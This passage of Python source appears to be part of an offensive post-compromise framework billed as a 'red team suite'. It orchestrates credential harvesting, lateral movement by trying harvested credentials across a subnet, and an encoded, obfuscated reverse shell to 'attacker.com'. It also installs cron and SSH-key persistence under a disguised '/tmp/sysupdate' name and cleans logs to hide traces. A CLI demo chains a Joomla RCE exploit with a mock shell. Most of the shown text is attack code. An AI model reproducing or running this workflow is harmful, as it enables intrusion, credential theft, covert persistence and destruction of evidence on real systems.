            workflow.execution_log.append({
                "step": 3,
                "phase": "credential_harvesting",
                "timestamp": datetime.utcnow().isoformat(),
                "result": "success",
                "credentials_harvested": len(harvested_creds),
            })

            # Step 4: Lateral movement
            self.logger.info("[4/5] Lateral Movement")
            hosts = await self.lateral.enumerate_network(initial_shell, "192.168.0.0/24")
            for host in hosts:
                services = await self.lateral.discover_services(host)
                for cred in harvested_creds[:3]:  # Try top 3 creds
                    for service in services.values():
                        access = await self.lateral.attempt_access(host, service, cred)
                        if access:
                            workflow.lateral_targets.append(host)
                            break

            workflow.execution_log.append({
                "step": 4,
                "phase": "lateral_movement",
                "timestamp": datetime.utcnow().isoformat(),
                "result": "success",
                "hosts_accessed": len(workflow.lateral_targets),
            })

            # Step 5: Persistence
            self.logger.info("[5/5] Persistence Installation")
            payload = self.payload_gen.generate_reverse_shell(
                "attacker.com", 4444,
                initial_shell.os_type
            )
            self.payload_gen.apply_encoding(payload, "base64")
            self.payload_gen.apply_obfuscation(payload, ["no_spaces"])

            persistence_results = await self.persistence.install_persistence(
                initial_shell,
                "/tmp/sysupdate",
                [PersistenceMethod.CRON, PersistenceMethod.SSH_KEY]
            )

            workflow.execution_log.append({
                "step": 5,
                "phase": "persistence",
                "timestamp": datetime.utcnow().isoformat(),
                "result": "success",
                "persistence_methods": list(persistence_results.keys()),
            })

            # Step 6: Stealth
            self.logger.info("[6/6] Log Cleanup")
            await self.stealth.cleanup_logs(initial_shell, ["sysupdate", "payload"])

            workflow.status = "completed"
            self.logger.info(f"Workflow completed: {workflow.name}")
            return True

        except Exception as e:
            self.logger.error(f"Workflow failed: {e}")
            workflow.status = "failed"
            return False

    def export_workflow(self, workflow_id: str, path: Path) -> None:
        """Export workflow state to JSON."""
        workflow = self.workflows.get(workflow_id)
        if not workflow:
            return

        data = asdict(workflow)
        with open(path, "w") as f:
            json.dump(data, f, indent=2)


# ─────────────────────────────────────────────────────────────────────────────
# CLI Interface
# ─────────────────────────────────────────────────────────────────────────────

async def main():
    """Red Team Suite CLI."""
    
    # Initialize components
    vault = CredentialVault(Path("/tmp/.vault"))
    orchestrator = AttackOrchestrator()
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║           RED TEAM OFFENSIVE SUITE - AUTHORIZED OPS          ║
║                 Deep Post-Compromise Framework                ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Example workflow
    print("[*] Creating attack workflow...")
    workflow = orchestrator.create_workflow(
        name="Full Chain: Recon to Exfil",
        target="192.168.1.100",
        initial_access="rce_via_unpatched_joomla",
        exploitation_chain=["cve_2023_23752", "privesc_sudo", "lateral_psexec"]
    )
    
    print(f"[+] Workflow created: {workflow.id}")
    print(f"[+] Initial access: {workflow.initial_access}")
    print(f"[+] Exploitation chain: {', '.join(workflow.exploitation_chain)}")
    
    # Create mock initial shell
    shell = Shell(
        host="192.168.1.100",
        port=4444,
        shell_type="bash",
        access_level=AccessLevel.USER,
        os_type=OSType.LINUX
    )
    
    print(f"\n[*] Mock shell established: {shell.id} ({shell.access_level.value} on {shell.os_type.value})")
    
    # Execute workflow
    print(f"\n[*] Executing workflow: {workflow.name}")
    success = await orchestrator.execute_workflow(workflow.id, shell)
    
    if success:
        print(f"\n[+] Workflow completed successfully")
        orchestrator.export_workflow(workflow.id, Path("/tmp/workflow_report.json"))
        print(f"[+] Report exported to /tmp/workflow_report.json")
    else:
        print(f"\n[-] Workflow failed")


if __name__ == "__main__":
    asyncio.run(main())
